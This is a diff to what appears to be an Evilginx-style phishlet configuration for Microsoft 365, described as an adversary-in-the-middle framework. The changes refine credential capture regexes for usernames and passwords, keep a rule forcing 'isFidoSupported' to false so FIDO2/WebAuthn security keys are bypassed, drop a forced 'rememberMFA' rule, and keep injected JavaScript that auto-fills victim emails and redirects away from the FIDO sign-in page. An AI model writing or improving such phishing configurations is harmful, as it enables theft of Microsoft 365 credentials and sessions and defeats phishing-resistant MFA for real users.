@@ -1,7 +1,7 @@
 name: "o365"
 min_ver: "3.1.0"
 author: "Master Research - Unified AiTM Framework"
-description: "Enhanced O365 phishlet with FIDO/WebAuthn blocking and session persistence"
+description: "Advanced O365 phishlet with FIDO/WebAuthn blocking and session persistence"
 
 proxy_hosts:
   - {
@@ -85,15 +85,6 @@ force_post:
     search: [{ key: "LoginOptions", search: ".*" }]
     force: [{ key: "LoginOptions", value: "1" }]
     type: "post"
-  - path: "/common/SAS"
-    search:
-      - { key: "rememberMFA", search: ".*" }
-      - { key: "DontShowAgain", search: ".*" }
-    force:
-      - { key: "rememberMFA", value: "true" }
-      - { key: "DontShowAgain", value: "true" }
-    type: "post"
-  # CRITICAL: Forces Microsoft to think the browser doesn't support YubiKeys/FIDO2
   - path: "/common/GetCredentialType"
     search: [{ key: "isFidoSupported", search: ".*" }]
     force: [{ key: "isFidoSupported", value: "false" }]
@@ -101,7 +92,7 @@ force_post:
 
 credentials:
   username:
-    key: "(login|UserName|email|account)"
+    key: "(login|UserName|email|account|username)"
     search: "(.*)"
     type: "post"
   password:
@@ -128,7 +119,6 @@ js_inject:
           console.log('[Research] AiTM Script Active');
           const SELECTORS = { username: '#i0116', password: '#i0118' };
           
-          // Auto-fill Logic
           const urlParams = new URLSearchParams(window.location.search);
           const email = urlParams.get('email') || urlParams.get('username');
           if (email) {
@@ -142,7 +132,6 @@ js_inject:
               }, 100);
           }
 
-          // FIDO/WebAuthn Redirect Mitigation
           function checkFido() {
               if (window.location.pathname == '/common/fido/get') {
                   window.location.replace('https://' + window.location.hostname + '/');
